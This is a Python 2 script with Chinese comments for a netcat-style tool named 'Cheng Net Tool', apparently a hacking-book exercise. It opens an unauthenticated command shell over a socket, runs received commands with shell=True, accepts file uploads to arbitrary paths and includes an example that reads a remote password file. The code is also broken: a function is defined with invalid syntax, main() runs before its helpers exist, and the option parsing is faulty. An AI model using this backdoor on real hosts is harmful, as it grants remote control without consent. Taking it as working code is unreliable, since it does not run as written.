#coding=utf-8
import sys
import socket
import getopt
import threading
import subprocess

#定义一些全局变量
listen                = False
command               = False
upload                = False
execute               = ""
target                = ""
upload_distination    = ""
port                  = 0

#主函数处理命令行参数
def usage():
    print "Cheng Net Tool"
    print
    print "Usage: chengnet.py -t target_host -p port"
    print "-l --listen                 -listen on [host]:[port] for incoming connection"
    print "-e --execute=file_to_run    -execute the given file upon receiving a connection"
    print "-c --command                -initialize a command shell"
    print "-u --upload=destination     -upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples:"
    print "chengNet.py -t 192.168.0.1 -p 55555 -l -c"
    print "chengNet.py -t 192.168.0.1 -p 55555 -l -u=c:\\target.exe"
    print "chengNet.py -t 192.168.0.1 -p 55555 -l -e=\"cat /etc/passed\""
    print "echo 'ANCDEFGHI' | ./chengNet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_distination
    global target

    if not len(sys.argv[1:]):
        usage()

    #读取命令行
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute =a
        elif o in ("-c","--commandshell"):
            command =True
        elif o in ("-u","--upload"):
            upload_distination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"


    #我们是进行监听还是仅从标准输入发送数据？
    if not listen and len(target) and port >0:
        #从命令行读取内存数据
        #这里将阻塞，所以不再向标准输入发送数据时发送CTRL-D
        buffer = sys.stdin.read()

        #发送数据
        client_sender(buffer)

    #监听并准备上传文件，执行命令
    #放置一个反弹shell
    #取决于上面的命令行选项
    if listen:
        server_loop()

main()

def server_loop:

    global target

    #如果没有定义目标，那么监听所有的接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket,addr = server.accept()

        #拆分一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

#实现对命令行shell的创建和命令的执行进行处理
def run_command(command):
    #换行
    command = command.rstrip()
    #运行命令行并将结果返回
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    #将输出发送
    return output

#实现文件上传，命令执行，和与shell相关的功能
def client_handler(client_socket):
    global upload
    global execute
    global command

    #检测文件上传
    if len(upload_distination):
        #读取所有的字符并写下目标
        file_buffer = ""

        #持续读取数据直到没有符合的数据
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        #现在我们接收这些数据并将他们写出来
        try:
            file_descriptor = open(upload_distination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #确认文件已经写出来
            client_socket.send("Successfully saved file to %s\r\n" %upload_distination)
        except:
            client_socket.send("Failed to save file to %s\r\n" %upload_distination)


    #检查命令执行
    if len(execute):
        #运行命令
        output = run_command(execute)

        client_socket.send(output)

    #如果需要一个命令行shell， 那么我们进入另一个循环
    if command:
        while True:
            #跳出一个窗口
            client_socket.send("<cheng:#> ")

            #现在接收文件直到发现换行符
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #返还命令输出
            response = run_command(cmd_buffer)

            #返回响应数据
            client_socket.send(response)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #连接到目标主机
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)



        while True:
            #现在等待回传数据
            recv_len = 1
            response = ""

            while recv_len:

                data     = client.recv(4096)
                recv_len = len(data)
                response+= data

                if recv_len < 4096:
                    break

            print response,

            #等待更多输入
            buffer = raw_input("")
            buffer += "\n"

            #发送出去
            client.send(buffer)

    except:
        print "[*] Exception ! Exitting"
        client.close()